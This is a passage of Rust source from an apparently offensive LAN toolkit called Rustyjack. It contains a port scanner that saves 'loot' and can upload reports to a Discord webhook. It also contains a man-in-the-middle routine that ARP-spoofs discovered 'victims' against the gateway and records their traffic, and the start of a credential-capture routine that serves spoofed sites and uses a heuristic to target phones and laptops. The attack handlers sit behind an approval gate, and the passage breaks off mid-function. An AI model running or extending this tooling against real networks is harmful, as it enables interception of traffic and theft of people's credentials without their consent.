    6000, 6001, 6379, 6667, 7001, 7002, 8000, 8008, 8009, 8080, 8081, 8086, 8088, 8443, 8888, 9000,
    9001, 9090, 9200, 9300, 9418, 9999, 10000, 11211, 27017,
];

#[derive(Debug, Clone)]
struct ScanConfig {
    ports: Vec<u16>,
    timeout: Duration,
    discovery: ScanDiscovery,
    no_discovery: bool,
    no_port_scan: bool,
    service_detect: bool,
    os_detect: bool,
    workers: usize,
    max_hosts: Option<usize>,
    arp_rate_pps: Option<u32>,
    warnings: Vec<String>,
    scan_mode: &'static str,
}

#[derive(Debug, Clone)]
struct HostDiscovery {
    ip: Ipv4Addr,
    ttl: Option<u8>,
    arp: bool,
    icmp: bool,
}

#[derive(Debug, Clone)]
struct HostScanResult {
    host: HostDiscovery,
    port_scan: Option<rustyjack_ethernet::PortScanResult>,
    errors: Vec<String>,
}

#[derive(Debug, Clone)]
enum ScanTarget {
    Network(Ipv4Net),
    Hosts(Vec<Ipv4Addr>),
}

pub fn run_scan_with_progress<F>(
    root: &Path,
    args: ScanRunArgs,
    cancel: Option<&CancelFlag>,
    mut on_progress: F,
) -> Result<HandlerResult>
where
    F: FnMut(f32, &str),
{
    check_cancel(cancel)?;
    let label = args.label.clone();
    let interface = args.interface.clone();
    let target = args.target.clone();
    let output_path = args.output_path.clone();
    let no_discord = args.no_discord;

    let interface_info = detect_interface(interface)?;
    check_cancel(cancel)?;
    enforce_single_interface(&interface_info.name)?;
    let target_str = target.unwrap_or_else(|| interface_info.network_cidr());
    let scan_target = parse_scan_target(&target_str)?;
    let mut config = build_scan_config(&args)?;
    apply_nmap_compat_args(&args.nmap_args, &mut config)?;
    if let Some(ref ports) = args.ports {
        config.ports = parse_port_list(ports)?;
    } else if let Some(limit) = args.top_ports {
        if limit == 0 {
            bail!("--top-ports must be greater than 0");
        }
        if limit > DEFAULT_SCAN_PORTS.len() {
            config.warnings.push(format!(
                "Requested top {} ports but only {} available",
                limit,
                DEFAULT_SCAN_PORTS.len()
            ));
            config.ports = top_ports(DEFAULT_SCAN_PORTS.len());
        } else {
            config.ports = top_ports(limit);
        }
    }

    let loot_path = output_path.unwrap_or(build_scan_loot_path(root, &label)?);
    if let Some(parent) = loot_path.parent() {
        std::fs::create_dir_all(parent).context("creating loot directory")?;
    }

    on_progress(0.0, "Preparing");
    check_cancel(cancel)?;

    let (hosts, discovery_summary) =
        if config.no_discovery || matches!(config.discovery, ScanDiscovery::None) {
            let hosts = expand_targets(&scan_target, config.max_hosts)?;
            let summary = format!("Discovery skipped (-Pn). Targets: {}", hosts.len());
            (
                hosts
                    .into_iter()
                    .map(|ip| HostDiscovery {
                        ip,
                        ttl: None,
                        arp: false,
                        icmp: false,
                    })
                    .collect::<Vec<_>>(),
                summary,
            )
        } else {
            let discovery = run_scan_discovery(
                &interface_info.name,
                &scan_target,
                config.discovery,
                config.arp_rate_pps,
                config.timeout,
                cancel,
            );
            let mut hosts = discovery.0;
            if let Some(limit) = config.max_hosts {
                if hosts.len() > limit {
                    hosts.truncate(limit);
                    config
                        .warnings
                        .push(format!("Host list truncated to {} via --max-hosts", limit));
                }
            }
            (hosts, discovery.1)
        };

    check_cancel(cancel)?;
    on_progress(20.0, "Discovery complete");

    let results = if config.no_port_scan {
        let entries = hosts
            .into_iter()
            .map(|host| HostScanResult {
                host,
                port_scan: None,
                errors: Vec::new(),
            })
            .collect();
        on_progress(100.0, "Discovery only");
        entries
    } else {
        let ports = config.ports.clone();
        if ports.is_empty() {
            bail!("No ports selected for scan");
        }
        check_cancel(cancel)?;
        let worker_count = config.workers.clamp(1, 32).min(hosts.len().max(1));
        let (scan_results, scan_errors) = scan_hosts(
            &hosts,
            &ports,
            config.timeout,
            interface_info.address,
            config.service_detect,
            worker_count,
            cancel,
            |done, total| {
                let pct = 20.0 + (done as f32 / total.max(1) as f32) * 80.0;
                on_progress(pct, "Port scan");
            },
        );
        merge_scan_results(hosts, scan_results, scan_errors)
    };

    check_cancel(cancel)?;
    let report = render_scan_report(
        &interface_info.name,
        interface_info.address,
        &target_str,
        &config,
        &discovery_summary,
        &results,
    );
    fs::write(&loot_path, report).with_context(|| format!("writing {}", loot_path.display()))?;

    on_progress(100.0, "Completed");
    check_cancel(cancel)?;

    let mut discord_sent = false;
    if !no_discord {
        check_cancel(cancel)?;
        discord_sent =
            send_scan_to_discord(root, &label, &loot_path, &target_str, &interface_info.name)?;
    }

    let output_path_str = loot_path.to_string_lossy().to_string();
    let data = json!({
        "label": label,
        "interface": interface_info.name,
        "target": target_str,
        "output_path": output_path_str,
        "discord_notified": discord_sent,
    });

    Ok(("Scan completed and loot saved".to_string(), data))
}

fn build_scan_config(args: &ScanRunArgs) -> Result<ScanConfig> {
    let mut config = ScanConfig {
        ports: Vec::new(),
        timeout: Duration::from_millis(args.timeout_ms.max(50)),
        discovery: args.discovery,
        no_discovery: args.no_discovery,
        no_port_scan: args.no_port_scan,
        service_detect: args.service_detect,
        os_detect: args.os_detect,
        workers: args.workers,
        max_hosts: args.max_hosts,
        arp_rate_pps: args.arp_rate_pps,
        warnings: Vec::new(),
        scan_mode: "connect",
    };

    if let Some(ref ports) = args.ports {
        config.ports = parse_port_list(ports)?;
    } else if let Some(limit) = args.top_ports {
        if limit == 0 {
            bail!("--top-ports must be greater than 0");
        }
        if limit > DEFAULT_SCAN_PORTS.len() {
            config.warnings.push(format!(
                "Requested top {} ports but only {} available",
                limit,
                DEFAULT_SCAN_PORTS.len()
            ));
            config.ports = top_ports(DEFAULT_SCAN_PORTS.len());
        } else {
            config.ports = top_ports(limit);
        }
    } else {
        config.ports = top_ports(DEFAULT_SCAN_PORTS.len());
    }

    Ok(config)
}

fn apply_nmap_compat_args(args: &[String], config: &mut ScanConfig) -> Result<()> {
    let mut iter = args.iter().peekable();
    while let Some(arg) = iter.next() {
        match arg.as_str() {
            "-sV" => config.service_detect = true,
            "-O" => config.os_detect = true,
            "-sn" => config.no_port_scan = true,
            "-Pn" => config.no_discovery = true,
            "-F" => config.ports = top_ports(100),
            "-sS" | "-sT" => {
                config.scan_mode = "connect";
                config
                    .warnings
                    .push(format!("Requested {} but using TCP connect scan", arg));
            }
            "-p" => {
                if let Some(value) = iter.next() {
                    config.ports = parse_port_list(value)?;
                } else {
                    bail!("Missing value for -p");
                }
            }
            value if value.starts_with("-p") && value.len() > 2 => {
                config.ports = parse_port_list(&value[2..])?;
            }
            "--top-ports" => {
                if let Some(value) = iter.next() {
                    let count = value.parse::<usize>().context("parsing --top-ports")?;
                    if count == 0 {
                        bail!("--top-ports must be greater than 0");
                    }
                    if count > DEFAULT_SCAN_PORTS.len() {
                        config.warnings.push(format!(
                            "Requested top {} ports but only {} available",
                            count,
                            DEFAULT_SCAN_PORTS.len()
                        ));
                        config.ports = top_ports(DEFAULT_SCAN_PORTS.len());
                    } else {
                        config.ports = top_ports(count);
                    }
                } else {
                    bail!("Missing value for --top-ports");
                }
            }
            value if value.starts_with("--top-ports=") => {
                let count = value["--top-ports=".len()..]
                    .parse::<usize>()
                    .context("parsing --top-ports")?;
                if count == 0 {
                    bail!("--top-ports must be greater than 0");
                }
                if count > DEFAULT_SCAN_PORTS.len() {
                    config.warnings.push(format!(
                        "Requested top {} ports but only {} available",
                        count,
                        DEFAULT_SCAN_PORTS.len()
                    ));
                    config.ports = top_ports(DEFAULT_SCAN_PORTS.len());
                } else {
                    config.ports = top_ports(count);
                }
            }
            value if value.starts_with("-T") && value.len() == 3 => {
                let level = value.chars().last().unwrap();
                apply_timing(level, config);
            }
            "--stats-every" => {
                let _ = iter.next();
            }
            other => {
                config
                    .warnings
                    .push(format!("Unsupported nmap flag ignored: {}", other));
            }
        }
    }
    Ok(())
}

fn apply_timing(level: char, config: &mut ScanConfig) {
    match level {
        '0' => {
            config.timeout = Duration::from_millis(2000);
            config.workers = 1;
        }
        '1' => {
            config.timeout = Duration::from_millis(1500);
            config.workers = 1;
        }
        '2' => {
            config.timeout = Duration::from_millis(1000);
            config.workers = config.workers.min(2).max(1);
        }
        '3' => {
            config.timeout = Duration::from_millis(600);
            config.workers = config.workers.max(4);
        }
        '4' => {
            config.timeout = Duration::from_millis(400);
            config.workers = config.workers.max(6);
        }
        '5' => {
            config.timeout = Duration::from_millis(200);
            config.workers = config.workers.max(8);
        }
        _ => {}
    }
}

fn parse_scan_target(target: &str) -> Result<ScanTarget> {
    if target.contains('/') {
        let net: Ipv4Net = target.parse().context("parsing target CIDR")?;
        return Ok(ScanTarget::Network(net));
    }
    if target.contains(',') {
        let mut hosts = Vec::new();
        for part in target.split(',') {
            let ip: Ipv4Addr = part.trim().parse().context("parsing target IP")?;
            hosts.push(ip);
        }
        return Ok(ScanTarget::Hosts(hosts));
    }
    let ip: Ipv4Addr = target.parse().context("parsing target IP")?;
    Ok(ScanTarget::Hosts(vec![ip]))
}

fn expand_targets(target: &ScanTarget, max_hosts: Option<usize>) -> Result<Vec<Ipv4Addr>> {
    match target {
        ScanTarget::Hosts(hosts) => {
            if let Some(limit) = max_hosts {
                Ok(hosts.iter().cloned().take(limit).collect())
            } else {
                Ok(hosts.clone())
            }
        }
        ScanTarget::Network(net) => {
            let host_count = ipv4_host_count(*net);
            if max_hosts.is_none() && host_count > 4096 {
                bail!(
                    "Target {} expands to {} hosts. Use --max-hosts to limit or enable discovery.",
                    net,
                    host_count
                );
            }
            let mut hosts = Vec::new();
            for ip in net.hosts() {
                hosts.push(ip);
                if let Some(limit) = max_hosts {
                    if hosts.len() >= limit {
                        break;
                    }
                }
            }
            Ok(hosts)
        }
    }
}

fn ipv4_host_count(net: Ipv4Net) -> u64 {
    let host_bits = 32u32.saturating_sub(net.prefix_len().into());
    match host_bits {
        0 => 1,
        1 => 2,
        bits => (1u64 << bits).saturating_sub(2),
    }
}

fn top_ports(limit: usize) -> Vec<u16> {
    let mut ports = Vec::new();
    for port in DEFAULT_SCAN_PORTS.iter().copied().take(limit) {
        ports.push(port);
    }
    dedup_ports(&mut ports);
    ports
}

fn parse_port_list(raw: &str) -> Result<Vec<u16>> {
    let mut ports = Vec::new();
    for part in raw.split(',') {
        let part = part.trim();
        if part.is_empty() {
            continue;
        }
        if let Some((start, end)) = part.split_once('-') {
            let start: u16 = start.trim().parse().context("parsing port range start")?;
            let end: u16 = end.trim().parse().context("parsing port range end")?;
            if start == 0 || end == 0 || end < start {
                bail!("Invalid port range {}", part);
            }
            for port in start..=end {
                ports.push(port);
            }
        } else {
            let port: u16 = part.parse().context("parsing port")?;
            if port == 0 {
                bail!("Invalid port 0");
            }
            ports.push(port);
        }
    }
    dedup_ports(&mut ports);
    Ok(ports)
}

fn dedup_ports(ports: &mut Vec<u16>) {
    ports.sort_unstable();
    ports.dedup();
}

fn run_scan_discovery(
    interface: &str,
    target: &ScanTarget,
    mode: ScanDiscovery,
    arp_rate_pps: Option<u32>,
    timeout: Duration,
    cancel: Option<&CancelFlag>,
) -> (Vec<HostDiscovery>, String) {
    if check_cancel(cancel).is_err() {
        return (Vec::new(), "Discovery cancelled".to_string());
    }

    let mut details = Vec::new();
    match target {
        ScanTarget::Network(net) => {
            if matches!(mode, ScanDiscovery::Arp | ScanDiscovery::Both) {
                if let Ok(arp_result) =
                    run_arp_discovery(interface, *net, arp_rate_pps, timeout, cancel)
                {
                    details.extend(arp_result.details);
                }
            }
            if matches!(mode, ScanDiscovery::Icmp | ScanDiscovery::Both) {
                if check_cancel(cancel).is_err() {
                    return (Vec::new(), "Discovery cancelled".to_string());
                }
                if let Ok(icmp_result) = discover_hosts(*net, timeout) {
                    details.extend(icmp_result.details);
                }
            }
        }
        ScanTarget::Hosts(hosts) => {
            for ip in hosts {
                if check_cancel(cancel).is_err() {
                    return (Vec::new(), "Discovery cancelled".to_string());
                }
                let net = match Ipv4Net::new(*ip, 32) {
                    Ok(n) => n,
                    Err(_) => continue,
                };
                if matches!(mode, ScanDiscovery::Arp | ScanDiscovery::Both) {
                    if let Ok(arp_result) =
                        run_arp_discovery(interface, net, arp_rate_pps, timeout, cancel)
                    {
                        details.extend(arp_result.details);
                    }
                }
                if matches!(mode, ScanDiscovery::Icmp | ScanDiscovery::Both) {
                    if check_cancel(cancel).is_err() {
                        return (Vec::new(), "Discovery cancelled".to_string());
                    }
                    if let Ok(icmp_result) = discover_hosts(net, timeout) {
                        details.extend(icmp_result.details);
                    }
                }
            }
        }
    }

    let mut map: HashMap<Ipv4Addr, HostDiscovery> = HashMap::new();
    for item in details {
        let entry = map.entry(item.ip).or_insert(HostDiscovery {
            ip: item.ip,
            ttl: None,
            arp: false,
            icmp: false,
        });
        match item.method {
            rustyjack_ethernet::DiscoveryMethod::Arp => entry.arp = true,
            rustyjack_ethernet::DiscoveryMethod::Icmp => entry.icmp = true,
        }
        if item.ttl.is_some() {
            entry.ttl = item.ttl;
        }
    }

    let mut hosts: Vec<HostDiscovery> = map.into_values().collect();
    hosts.sort_by_key(|h| h.ip);

    let summary = format!(
        "Discovery: {} host(s) found via {}",
        hosts.len(),
        match mode {
            ScanDiscovery::Arp => "arp",
            ScanDiscovery::Icmp => "icmp",
            ScanDiscovery::Both => "arp+icmp",
            ScanDiscovery::None => "none",
        }
    );
    (hosts, summary)
}

fn scan_hosts<F>(
    hosts: &[HostDiscovery],
    ports: &[u16],
    timeout: Duration,
    source_ip: Ipv4Addr,
    capture_banners: bool,
    workers: usize,
    cancel: Option<&CancelFlag>,
    mut on_progress: F,
) -> (
    HashMap<Ipv4Addr, rustyjack_ethernet::PortScanResult>,
    HashMap<Ipv4Addr, String>,
)
where
    F: FnMut(usize, usize),
{
    let queue: VecDeque<Ipv4Addr> = hosts.iter().map(|h| h.ip).collect();
    let queue = std::sync::Arc::new(std::sync::Mutex::new(queue));
    let ports = std::sync::Arc::new(ports.to_vec());
    let (tx, rx) = std::sync::mpsc::channel();
    let cancel_flag = cancel.cloned();
    let mut handles = Vec::new();
    let total = hosts.len();
    let worker_count = workers.clamp(1, 32).min(total.max(1));

    for _ in 0..worker_count {
        let queue = std::sync::Arc::clone(&queue);
        let ports = std::sync::Arc::clone(&ports);
        let tx = tx.clone();
        let cancel_flag = cancel_flag.clone();
        let handle = std::thread::spawn(move || {
            loop {
                if let Some(flag) = cancel_flag.as_ref() {
                    if flag.load(std::sync::atomic::Ordering::Relaxed) {
                        break;
                    }
                }
                let ip = {
                    let mut guard = queue.lock().ok()?;
                    guard.pop_front()
                };
                let Some(ip) = ip else {
                    break;
                };
                let result = if let Some(flag) = cancel_flag.as_ref() {
                    rustyjack_ethernet::quick_port_scan_with_source_cancellable(
                        ip,
                        &ports,
                        timeout,
                        source_ip,
                        capture_banners,
                        flag,
                    )
                } else {
                    rustyjack_ethernet::quick_port_scan_with_source(
                        ip,
                        &ports,
                        timeout,
                        source_ip,
                        capture_banners,
                    )
                };
                let _ = tx.send((ip, result));
            }
            Some(())
        });
        handles.push(handle);
    }

    drop(tx);
    let mut done = 0usize;
    let mut results = HashMap::new();
    let mut errors = HashMap::new();
    for received in rx {
        if let Some(flag) = cancel_flag.as_ref() {
            if flag.load(std::sync::atomic::Ordering::Relaxed) {
                break;
            }
        }
        done += 1;
        if let (ip, Ok(scan)) = received {
            results.insert(ip, scan);
        } else if let (ip, Err(err)) = received {
            errors.insert(ip, err.to_string());
        }
        on_progress(done, total);
    }

    for handle in handles {
        let _ = handle.join();
    }

    (results, errors)
}

fn merge_scan_results(
    hosts: Vec<HostDiscovery>,
    scans: HashMap<Ipv4Addr, rustyjack_ethernet::PortScanResult>,
    errors: HashMap<Ipv4Addr, String>,
) -> Vec<HostScanResult> {
    let mut results = Vec::new();
    for host in hosts {
        let mut host_errors = Vec::new();
        let ip = host.ip;
        if let Some(err) = errors.get(&ip) {
            host_errors.push(err.clone());
        }
        let port_scan = scans.get(&ip).cloned();
        results.push(HostScanResult {
            host,
            port_scan,
            errors: host_errors,
        });
    }
    results
}

fn render_scan_report(
    interface: &str,
    source_ip: Ipv4Addr,
    target: &str,
    config: &ScanConfig,
    discovery_summary: &str,
    results: &[HostScanResult],
) -> String {
    let mut out = String::new();
    out.push_str("Rustyjack Scan Report\n");
    out.push_str(&format!(
        "Timestamp: {}\n",
        Local::now().format("%Y-%m-%d %H:%M:%S")
    ));
    out.push_str(&format!("Interface: {} ({})\n", interface, source_ip));
    out.push_str(&format!("Target: {}\n", target));
    out.push_str(&format!("Scan mode: TCP {} scan\n", config.scan_mode));
    out.push_str(&format!("Timeout per port: {:?}\n", config.timeout));
    out.push_str(&format!("Ports scanned: {} total\n", config.ports.len()));
    out.push_str(&format!(
        "Service detection: {}\n",
        if config.service_detect {
            "enabled"
        } else {
            "disabled"
        }
    ));
    out.push_str(&format!(
        "OS detection: {}\n",
        if config.os_detect {
            "enabled"
        } else {
            "disabled"
        }
    ));
    out.push_str(&format!("Discovery: {:?}\n", config.discovery));
    out.push_str(&format!("{discovery_summary}\n"));

    if !config.warnings.is_empty() {
        out.push_str("\nWarnings:\n");
        for warn in &config.warnings {
            out.push_str(&format!("- {}\n", warn));
        }
    }

    if results.is_empty() {
        out.push_str("\nNo hosts discovered.\n");
        return out;
    }

    for host in results {
        out.push_str("\n-------------------------------\n");
        out.push_str(&format!("Scan report for {}\n", host.host.ip));
        let method = match (host.host.arp, host.host.icmp) {
            (true, true) => "arp+icmp",
            (true, false) => "arp",
            (false, true) => "icmp",
            (false, false) => "assumed",
        };
        out.push_str(&format!("Host is up ({})\n", method));
        if config.os_detect {
            if let Some(ttl) = host.host.ttl {
                let os_guess =
                    rustyjack_ethernet::guess_os_from_ttl(Some(ttl)).unwrap_or("unknown");
                out.push_str(&format!("TTL: {} (OS guess: {})\n", ttl, os_guess));
            } else {
                out.push_str("TTL: unknown\n");
            }
        }
        if let Some(scan) = &host.port_scan {
            let open_count = scan.open_ports.len();
            let closed = config.ports.len().saturating_sub(open_count);
            if open_count == 0 {
                out.push_str(&format!(
                    "All {} scanned ports are closed\n",
                    config.ports.len()
                ));
            } else {
                out.push_str("PORT     STATE SERVICE INFO\n");
                let banner_map = build_banner_map(&scan.banners);
                for port in &scan.open_ports {
                    let service = service_name(*port);
                    let info = if config.service_detect {
                        banner_map
                            .get(port)
                            .map(|b| truncate_scan_info(&b.banner, 60))
                            .unwrap_or_else(|| "".to_string())
                    } else {
                        "".to_string()
                    };
                    out.push_str(&format!("{:>5}/tcp open  {:<7} {}\n", port, service, info));
                }
                out.push_str(&format!("Not shown: {} closed ports\n", closed));
            }
        } else {
            out.push_str("Port scan skipped (-sn)\n");
        }
        if !host.errors.is_empty() {
            out.push_str("Errors:\n");
            for err in &host.errors {
                out.push_str(&format!("- {}\n", err));
            }
        }
    }

    out
}

fn build_banner_map(
    banners: &[rustyjack_ethernet::PortBanner],
) -> HashMap<u16, rustyjack_ethernet::PortBanner> {
    let mut map = HashMap::new();
    for banner in banners {
        map.insert(banner.port, banner.clone());
    }
    map
}

fn truncate_scan_info(input: &str, max: usize) -> String {
    let trimmed = input.trim();
    if trimmed.len() <= max {
        return trimmed.to_string();
    }
    let mut out = String::new();
    for (idx, ch) in trimmed.chars().enumerate() {
        if idx + 3 >= max {
            break;
        }
        out.push(ch);
    }
    out.push_str("...");
    out
}

fn service_name(port: u16) -> &'static str {
    match port {
        20 => "ftp",
        21 => "ftp",
        22 => "ssh",
        23 => "telnet",
        25 => "smtp",
        26 => "smtp",
        53 => "dns",
        67 => "dhcp",
        68 => "dhcp",
        69 => "tftp",
        79 => "finger",
        80 => "http",
        81 | 82 | 83 | 84 | 85 => "http",
        88 => "kerberos",
        110 => "pop3",
        111 => "rpc",
        119 => "nntp",
        123 => "ntp",
        135 => "msrpc",
        137 | 138 | 139 => "netbios",
        143 => "imap",
        161 => "snmp",
        162 => "snmptrap",
        179 => "bgp",
        389 => "ldap",
        443 => "https",
        445 => "smb",
        465 => "smtps",
        514 => "syslog",
        515 => "printer",
        543 | 544 => "klogin",
        548 => "afp",
        554 => "rtsp",
        587 => "smtp",
        631 => "ipp",
        636 => "ldaps",
        873 => "rsync",
        902 => "vmware",
        989 | 990 => "ftps",
        993 => "imaps",
        995 => "pop3s",
        1025..=1030 => "msrpc",
        1110 => "pop3",
        1433 => "mssql",
        1720 => "h323",
        1723 => "pptp",
        1755 => "rtsp",
        1900 => "ssdp",
        2000..=2002 => "cisco",
        2049 => "nfs",
        2082 | 2083 => "cpanel",
        2100 => "oracle",
        2222 => "ssh",
        2301 => "compaq",
        2381 => "oracle",
        2483 | 2484 => "oracle",
        3128 => "proxy",
        3306 => "mysql",
        3389 => "rdp",
        3690 => "svn",
        4444 => "metasploit",
        4567 => "distcc",
        5000 | 5001 => "upnp",
        5060 | 5061 => "sip",
        5432 => "postgres",
        5631 => "pcanywhere",
        5900 => "vnc",
        5985 | 5986 => "winrm",
        6000 | 6001 => "x11",
        6379 => "redis",
        6667 => "irc",
        7001 | 7002 => "weblogic",
        8000 | 8008 | 8009 => "http",
        8080 | 8081 | 8086 | 8088 => "http",
        8443 => "https",
        8888 => "http",
        9000 | 9001 => "http",
        9090 => "http",
        9200 | 9300 => "elasticsearch",
        9418 => "git",
        9999 => "abyss",
        10000 => "webmin",
        11211 => "memcache",
        27017 => "mongodb",
        _ => "unknown",
    }
}

fn handle_discord_send(root: &Path, args: DiscordSendArgs) -> Result<HandlerResult> {
    let DiscordSendArgs {
        title,
        message,
        file,
        target,
        interface,
    } = args;

    if message.is_none() && file.is_none() {
        bail!("Either --message or --file must be provided");
    }

    let embed = build_manual_embed(&title, target.as_deref(), interface.as_deref());
    let sent = send_discord_payload(root, Some(embed), file.as_deref(), message.as_deref())?;

    let data = json!({
        "sent": sent,
        "file": file.as_ref().map(|p| p.to_string_lossy().to_string()),
    });

    let message = if sent {
        "Discord notification sent".to_string()
    } else {
        "Discord webhook not configured".to_string()
    };

    Ok((message, data))
}

fn handle_discord_status(root: &Path) -> Result<HandlerResult> {
    let configured = read_discord_webhook(root)?.is_some();
    let data = json!({ "configured": configured });
    let message = if configured {
        "Discord webhook configured".to_string()
    } else {
        "Discord webhook missing".to_string()
    };
    Ok((message, data))
}

fn handle_mitm_start(
    root: &Path,
    args: MitmStartArgs,
    cancel: Option<&CancelFlag>,
) -> Result<HandlerResult> {
    let MitmStartArgs {
        interface,
        network,
        max_hosts,
        label,
    } = args;
    if !offensive_review_approved(root) {
        let mut errors = Vec::new();
        let mut warnings = Vec::new();
        let interface_info = match detect_interface(interface.clone()) {
            Ok(info) => Some(info),
            Err(e) => {
                errors.push(format!("Interface detection failed: {}", e));
                None
            }
        };
        let gateway = match default_gateway_ip() {
            Ok(ip) => Some(ip.to_string()),
            Err(e) => {
                warnings.push(format!("Gateway detection failed: {}", e));
                None
            }
        };
        let checks = json!({
            "interface": interface_info
                .as_ref()
                .map(|i| i.name.clone())
                .or_else(|| interface.clone()),
            "network": network,
            "gateway": gateway,
            "max_hosts": max_hosts,
            "label": label,
        });
        return preflight_only_response(
            root,
            crate::audit::operations::MITM_START,
            checks,
            errors,
            warnings,
        );
    }

    let interface_info = detect_interface(interface)?;

    enforce_single_interface(&interface_info.name)?;
    check_cancel(cancel)?;

    let gateway = default_gateway_ip().context("determining default gateway for MITM")?;
    let network = network.unwrap_or_else(|| interface_info.network_cidr());

    let _ = stop_arp_spoof();
    let _ = stop_pcap_capture();

    let hosts = scan_local_hosts_cancellable(&interface_info.name, cancel)?;
    let victims: Vec<_> = hosts
        .into_iter()
        .filter(|host| host.ip != gateway)
        .collect();
    if victims.is_empty() {
        bail!("No victims discovered on the local network");
    }

    enable_ip_forwarding(true)?;

    let capped = victims
        .iter()
        .take(max_hosts.max(1))
        .cloned()
        .collect::<Vec<_>>();
    let skipped = victims.len().saturating_sub(capped.len());

    if capped.is_empty() {
        bail!("No victims discovered on the local network");
    }

    for host in &capped {
        spawn_arpspoof_pair(&interface_info.name, gateway, host)?;
    }

    let loot_label = label
        .or_else(|| Some(network.clone()))
        .unwrap_or_else(|| "MITM".to_string());
    let pcap_path = build_mitm_pcap_path(root, Some(&loot_label))?;
    let pcap_display = pcap_path.to_string_lossy().to_string();
    start_pcap_capture(&interface_info.name, &pcap_path)?;
    let _ = log_mac_usage(
        root,
        &interface_info.name,
        "ethernet_mitm",
        Some(&sanitize_label(&loot_label)),
    );

    let data = json!({
        "interface": interface_info.name,
        "victim_count": capped.len(),
        "victims_skipped": skipped,
        "gateway": gateway,
        "pcap_path": pcap_display,
        "loot_dir": pcap_path.parent().map(|p| p.to_string_lossy().to_string()),
        "network": network,
        "max_hosts": max_hosts,
        "isolation_enforced": true,
    });

    let _ = write_scoped_log(
        root,
        "Ethernet",
        &network,
        "MITM",
        "mitm",
        &[
            format!("MITM started on {}", network),
            format!("Interface: {}", interface_info.name),
            format!("Victims: {}", capped.len()),
            format!("Gateway: {}", gateway),
            format!("PCAP: {}", pcap_path.display()),
        ],
    );

    Ok(("MITM started".to_string(), data))
}

fn is_probably_human_device(device: &DeviceInfo) -> bool {
    let hostname = device
        .hostname
        .as_deref()
        .unwrap_or("")
        .to_ascii_lowercase();
    let os = device.os_hint.as_deref().unwrap_or("").to_ascii_lowercase();
    let services: String = device
        .services
        .iter()
        .map(|s| s.detail.to_ascii_lowercase())
        .collect::<Vec<_>>()
        .join(" ");

    let avoid_keywords = [
        "router",
        "gateway",
        "printer",
        "nas",
        "camera",
        "cam",
        "switch",
        "ap",
        "uap",
        "unifi",
        "tplink",
        "tp-link",
        "mikrotik",
        "hik",
        "dvr",
        "nvr",
        "tv",
        "roku",
        "fire",
        "chromecast",
        "sonos",
        "esp",
        "shelly",
        "yeelight",
        "tuya",
    ];
    if avoid_keywords
        .iter()
        .any(|k| hostname.contains(k) || os.contains(k) || services.contains(k))
    {
        return false;
    }

    let human_keywords = [
        "iphone", "ipad", "android", "pixel", "samsung", "oneplus", "mac", "macbook", "imac",
        "mbp", "windows", "win", "laptop", "notebook", "thinkpad", "dell", "lenovo", "hp",
        "surface", "pc", "desktop",
    ];
    if human_keywords
        .iter()
        .any(|k| hostname.contains(k) || os.contains(k) || services.contains(k))
    {
        return true;
    }

    // Port-based hints for user endpoints
    let ports = &device.open_ports;
    let human_ports = [
        139u16, 445, 3389, 62078, 62000, 5000, 7000, 7001, 7100, 5353,
    ];
    if human_ports.iter().any(|p| ports.contains(p)) {
        return true;
    }

    // Heuristic TTL: very high TTL likely infra, mid/low may be user endpoints.
    if let Some(ttl) = device.ttl {
        if ttl >= 240 {
            return false;
        }
        if ttl >= 32 {
            return true;
        }
    }

    false
}

fn build_portal_config(
    interface: &str,
    listen_ip: Ipv4Addr,
    site_dir: PathBuf,
    capture_dir: PathBuf,
) -> PortalConfig {
    PortalConfig {
        interface: interface.to_string(),
        listen_ip,
        listen_port: 80,
        site_dir,
        capture_dir,
        max_body_bytes: 16 * 1024,
        max_concurrency: 32,
        request_timeout: Duration::from_secs(5),
        dnat_mode: false,
        bind_to_device: false,
    }
}

fn handle_eth_site_cred_capture(
    root: &Path,
    args: EthernetSiteCredArgs,
    cancel: Option<&CancelFlag>,
) -> Result<HandlerResult> {
    let EthernetSiteCredArgs {
        interface,
        target,
        site,
        max_hosts,
        timeout_ms,
    } = args;

    if !offensive_review_approved(root) {
        let mut errors = Vec::new();
        let warnings = Vec::new();
        let site_dir = root.join("DNSSpoof").join("sites").join(&site);
        if !site_dir.exists() {
            errors.push(format!("DNS spoof site not found: {}", site_dir.display()));
        }
        let interface_info = match detect_ethernet_interface(interface.clone()) {
            Ok(info) => Some(info),
            Err(e) => {
                errors.push(format!("Interface detection failed: {}", e));
                None
            }
        };
        if let Some(ref cidr) = target {
            if cidr.parse::<Ipv4Net>().is_err() {
                errors.push(format!("Invalid target CIDR: {}", cidr));
            }
        }
        let checks = json!({
            "interface": interface_info
                .as_ref()
                .map(|i| i.name.clone())
                .or_else(|| interface.clone()),
            "target": target,
            "site": site,
            "max_hosts": max_hosts,
            "timeout_ms": timeout_ms,
            "site_dir": site_dir.display().to_string(),
        });
        return preflight_only_response(
            root,
            crate::audit::operations::SITE_CRED_CAPTURE,
            checks,
            errors,
            warnings,
        );
    }

    let site_dir = root.join("DNSSpoof").join("sites").join(&site);
    if !site_dir.exists() {
        bail!("DNS spoof site not found: {}", site_dir.display());
    }

    let interface_info = detect_ethernet_interface(interface)?;
    let cidr = target.unwrap_or_else(|| interface_info.network_cidr());
    let net: Ipv4Net = cidr.parse().context("parsing target CIDR")?;

    let timeout = Duration::from_millis(timeout_ms.max(200));
    check_cancel(cancel)?;

    // Discovery + inventory
    let mut details = Vec::new();
    match run_arp_discovery(&interface_info.name, net, Some(50), timeout, cancel) {
        Ok(arp) => details.extend(arp.details),
        Err(err) => {
            if is_cancelled_error(&err) {
                return Err(err);
            }
        }
    }
    check_cancel(cancel)?;
    if let Some(flag) = cancel {
        match discover_hosts_cancellable(net, timeout, flag) {
            Ok(icmp) => {
                for d in icmp.details {
                    if !details.iter().any(|h| h.ip == d.ip) {
                        details.push(d);
                    }
                }
            }
            Err(err) => {
                if is_cancelled_error(&err) {
                    return Err(err);
                }
            }
        }
    } else if let Ok(icmp) = discover_hosts(net, timeout) {
        for d in icmp.details {
            if !details.iter().any(|h| h.ip == d.ip) {
                details.push(d);
            }
        }
    }
    let hosts: Vec<Ipv4Addr> = details
        .iter()
        .map(|d| d.ip)
        .collect::<std::collections::HashSet<_>>()
        .into_iter()
        .collect();

    let discovery = LanDiscoveryResult {
        network: net,
        hosts: hosts.clone(),
        details: details.clone(),
    };

    let default_ports = vec![
        22, 80, 443, 445, 139, 3389, 53, 8080, 8000, 8443, 5353, 62078,
    ];
    let devices = if let Some(flag) = cancel {
        build_device_inventory_cancellable(&discovery, &default_ports, timeout, flag)?
    } else {
        build_device_inventory(&discovery, &default_ports, timeout)?
    };

